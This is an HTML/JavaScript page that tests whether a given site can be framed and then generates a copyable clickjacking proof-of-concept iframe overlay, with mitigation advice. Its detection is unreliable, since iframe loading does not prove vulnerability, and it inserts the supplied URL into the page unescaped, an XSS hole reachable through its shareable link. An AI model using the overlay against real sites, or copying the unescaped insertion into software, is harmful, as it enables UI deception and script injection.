<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Clickjacking PoC Tester (Enhanced)</title>
  <style>
    
  </style>
</head>
<body>
  <h1>Clickjacking PoC Tester</h1>
  <input id="targetUrl" placeholder="https://example.com">
  <button onclick="runTest()">Test</button>
  <div id="result"></div>

<script>
async function runTest() {
  const url = document.getElementById('targetUrl').value.trim();
  const res = document.getElementById('result');
  res.innerHTML = '';

  
  try {
    const response = await fetch(url, { method: 'HEAD', mode: 'cors' });
    const xfo = response.headers.get('X-Frame-Options') || 'None';
    const csp = response.headers.get('Content-Security-Policy') || 'None';
    res.innerHTML += `<p> X-Frame-Options: <b>${xfo}</b><br>CSP frame-ancestors: <b>${csp}</b></p>`;
  } catch(e) {
    res.innerHTML += `<p>Unable to fetch headers due to CORSâ€”run via server proxy for accurate results.</p>`;
  }

 
  const iframe = document.createElement('iframe');
  iframe.src = url;
  res.appendChild(iframe);

  let fired = false;
  iframe.onload = () => (!fired && setTimeout(() => { fired = true; res.innerHTML += `<p style="color:red;"><b>Vulnerable:</b> iframe loaded.</p>`; showPoC(); }, 100));
  iframe.onerror = () => (!fired && (fired = true, res.innerHTML += `<p style="color:green;"><b>Protected:</b> cannot be iframed.</p>`), showPoC());
  setTimeout(() => (!fired && (fired = true, res.innerHTML += `<p style="color:orange;"><b>Unknown:</b> no definitive result yet.</p>`), showPoC()), 1500);

  function showPoC() {
    res.innerHTML += `
      <h3>PoC Snippet</h3>
      <pre>&lt;iframe src="${url}" style="opacity:0.5;position:absolute;top:0;left:0;width:100%;height:100%;"&gt;&lt;/iframe&gt;
&lt;button style="position:relative;z-index:999;"&gt;Click Me&lt;/button&gt;</pre>
      <button onclick="navigator.clipboard.writeText(document.querySelector('pre').innerText)">Copy PoC</button>`;
    res.innerHTML += `
      <p>Shareable link: <a href="?url=${encodeURIComponent(url)}">${window.location.origin + window.location.pathname}?url=${encodeURIComponent(url)}</a></p>
      <div class="info">
        <h3>Description</h3><p>Clickjacking is a UI redress attack... (OWASP) </p>
        <h3>Mitigation</h3><ul><li>Content-Security-Policy: frame-ancestors 'none'</li><li>X-Frame-Options: DENY</li></ul>
      </div>`;
  }
}


window.addEventListener('DOMContentLoaded', () => {
  const u = new URLSearchParams(location.search).get('url');
  if (u) {
    document.getElementById('targetUrl').value = u;
    runTest();
  }
});
</script>
</body>
</html>
